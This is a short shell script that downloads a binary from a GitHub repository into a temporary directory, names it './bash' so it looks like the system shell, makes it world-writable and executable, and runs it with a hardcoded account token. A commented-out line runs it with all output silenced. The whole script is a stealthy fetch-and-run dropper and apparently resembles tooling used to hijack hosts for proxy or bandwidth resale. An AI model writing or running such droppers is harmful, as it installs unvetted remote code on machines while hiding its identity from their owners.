#!/bin/sh

token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
tmp="$(mktemp -d)" && cd "$tmp"
wget -qO "./bash" https://github.com/hanrzme/meme/raw/refs/heads/main/Cli_20241204_e0a205f20ba2ad6c11359beef38fca34
chmod 777 "./bash"
./bash start accept --token "${token}"
#./bash start accept --token "${token}" >/dev/null 2>&1
